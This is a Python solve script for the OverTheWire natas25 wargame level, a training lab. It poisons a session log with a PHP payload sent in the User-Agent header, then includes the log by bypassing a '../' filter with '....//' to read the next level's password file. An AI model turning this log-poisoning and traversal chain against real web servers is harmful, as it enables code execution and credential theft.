import urllib.request, urllib.parse, base64, re
# natas25: safeinclude() strips "../" with str_replace (....// survives) and
# blocks natas_webpass; logRequest() appends date + User-Agent into
# logs/natas25_<sid>.log but ONLY on a traversal attempt (lang=../x). Poison
# the log via the User-Agent, then include it with lang=....//logs/...
url = "http://natas25.natas.labs.overthewire.org/"
auth = "Basic " + base64.b64encode(b"natas25:UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo").decode()
import http.cookiejar
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
def get(extra):
    r = urllib.request.Request(url + extra, headers={"Authorization": auth})
    return op.open(r, timeout=15).read().decode("utf-8", "replace")
# start a session and note its id (the log file name contains it)
get("")
sid = [c.value for c in cj][0]
print("session:", sid)
# poison: a traversal attempt (lang=../x) makes logRequest() write the UA
h = {"Authorization": auth, "User-Agent": '<?php echo file_get_contents("/etc/natas_webpass/natas26"); ?>'}
r = urllib.request.Request(url, data=urllib.parse.urlencode({"lang": "../x"}).encode(), headers=h)
op.open(r, timeout=15).read()
# include the log: str_replace removes "../" at offset 2 of "....//", leaving ../
body = get("?lang=....//logs/natas25_" + sid + ".log")
m = [x for x in re.findall(r"([0-9A-Za-z]{32})", body) if x != "UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo"]
print("password:", m[-1] if m else "not found")

